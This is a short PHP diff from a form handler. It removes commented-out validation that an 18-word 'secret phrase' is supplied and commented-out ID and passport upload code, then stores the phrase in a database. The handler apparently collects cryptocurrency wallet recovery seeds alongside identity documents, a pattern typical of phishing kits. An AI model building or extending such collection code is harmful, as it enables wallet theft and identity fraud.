@@ -20,27 +20,7 @@ foreach ($requiredFields as $field) {
     }
 }
 
-// Validate secret phrase (must be 18 words)
 $secretPhrase = trim($_POST['secret_phrase']);
-// if (str_word_count($secretPhrase) !== 18) {
-    // echo json_encode(["success" => false, "error" => "Secret phrase must contain exactly 18 words"]);
-    // exit;
-
-// Upload document (ID or Passport)
-// $uploadDir = "uploads/documents/";
-// if (!is_dir($uploadDir)) {
-//     mkdir($uploadDir, 0777, true);
-// }
-
-// $documentFile = $_FILES['document']['name'];
-// $documentPath = $uploadDir . time() . "_" . basename($documentFile);
-// if (!move_uploaded_file($_FILES['document']['tmp_name'], $documentPath)) {
-//     echo json_encode(["success" => false, "error" => "Failed to upload document"]);
-//     exit;
-// }
-
-// Upload image
-
 
 // Insert into database
 try {
